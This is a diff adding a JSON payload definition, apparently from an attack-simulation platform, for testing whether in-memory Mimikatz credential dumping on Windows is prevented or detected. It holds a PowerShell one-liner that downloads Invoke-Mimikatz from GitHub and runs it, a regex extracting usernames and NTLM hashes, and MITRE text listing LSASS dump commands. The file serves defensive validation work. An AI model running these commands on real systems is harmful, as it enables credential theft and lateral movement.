@@ -1,1 +1,75 @@
-
+{
+  "export_version" : 1,
+  "payload_information" : {
+    "payload_id" : "56a1b6bb-f403-41be-993c-bdda2467978b",
+    "payload_type" : "Command",
+    "payload_name" : "In-Memory Mimikatz- DumpCreds",
+    "payload_description" : "In-Memory Mimikatz",
+    "payload_platforms" : [ "Windows" ],
+    "payload_attack_patterns" : [ {
+      "attack_pattern_id" : "9fabc664-7f82-4f22-9411-f64569aeb1e0",
+      "attack_pattern_name" : "LSASS Memory",
+      "attack_pattern_description" : "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
+      "attack_pattern_external_id" : "T1003.001",
+      "attack_pattern_kill_chain_phases" : null
+    } ],
+    "payload_cleanup_executor" : null,
+    "payload_cleanup_command" : null,
+    "payload_elevation_required" : false,
+    "payload_arguments" : [ ],
+    "payload_prerequisites" : [ ],
+    "payload_external_id" : null,
+    "payload_source" : "MANUAL",
+    "payload_expectations" : [ "PREVENTION", "DETECTION" ],
+    "payload_status" : "VERIFIED",
+    "payload_execution_arch" : "ALL_ARCHITECTURES",
+    "payload_collector" : null,
+    "payload_detection_remediations" : [ ],
+    "payload_tags" : [ ],
+    "payload_output_parsers" : [ {
+      "output_parser_id" : "6e4b23ad-f709-4bc6-8088-e6e87c39f33c",
+      "output_parser_mode" : "STDOUT",
+      "output_parser_type" : "REGEX",
+      "output_parser_contract_output_elements" : [ {
+        "contract_output_element_id" : "b878d7c7-9647-44c8-8724-c00d11994778",
+        "contract_output_element_is_finding" : true,
+        "contract_output_element_rule" : "(?:\\\\t|\\s)*\\*?\\s*Username\\s*:\\s*([^\\s\\\\r\\\\n]+)[\\s\\S]*?NTLM\\s*:\\s*([A-Fa-f0-9]{32})",
+        "contract_output_element_name" : "Mimikatz_Memory_NTLM",
+        "contract_output_element_regex_groups" : [ {
+          "regex_group_id" : "0b8513f7-de4e-43e5-923f-e05ded1e0ca6",
+          "regex_group_field" : "password",
+          "regex_group_index_values" : "$2",
+          "regex_group_created_at" : "2025-09-11T15:22:19.200517Z",
+          "regex_group_updated_at" : "2025-09-11T15:22:19.200517Z"
+        }, {
+          "regex_group_id" : "7481286e-2eb5-41ed-8021-8320ac95cf09",
+          "regex_group_field" : "username",
+          "regex_group_index_values" : "$1",
+          "regex_group_created_at" : "2025-09-11T15:22:19.200517Z",
+          "regex_group_updated_at" : "2025-09-11T15:22:19.200517Z"
+        } ],
+        "contract_output_element_key" : "Mimikatz_Memory_NTLM",
+        "contract_output_element_type" : "credentials",
+        "contract_output_element_tags" : [ ],
+        "contract_output_element_created_at" : "2025-09-11T15:22:19Z",
+        "contract_output_element_updated_at" : "2025-09-11T15:22:19Z"
+      } ],
+      "output_parser_created_at" : "2025-09-11T15:22:19.200026Z",
+      "output_parser_updated_at" : "2025-09-11T15:22:19.200026Z"
+    } ],
+    "payload_created_at" : "2025-09-11T14:32:38.885665Z",
+    "payload_updated_at" : "2025-09-11T15:22:19.199803Z",
+    "command_executor" : "psh",
+    "command_content" : "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/g4uss47/Invoke-Mimikatz/master/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\n",
+    "payload_collector_type" : null
+  },
+  "payload_arguments_documents" : [ ],
+  "payload_tags" : [ ],
+  "payload_attack_patterns" : [ {
+    "attack_pattern_id" : "9fabc664-7f82-4f22-9411-f64569aeb1e0",
+    "attack_pattern_name" : "LSASS Memory",
+    "attack_pattern_description" : "Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).\n\nAs well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.\n\nFor example, on the target host use procdump:\n\n* <code>procdump -ma lsass.exe lsass_dump</code>\n\nLocally, mimikatz can be run using:\n\n* <code>sekurlsa::Minidump lsassdump.dmp</code>\n* <code>sekurlsa::logonPasswords</code>\n\nBuilt-in Windows tools such as `comsvcs.dll` can also be used:\n\n* <code>rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump PID  lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)\n\nSimilar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)\n\nWindows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Security Packages</code> and <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014)\n\nThe following SSPs can be used to access credentials:\n\n* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.\n* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)\n* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.\n* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)\n",
+    "attack_pattern_external_id" : "T1003.001",
+    "attack_pattern_kill_chain_phases" : null
+  } ]
+}
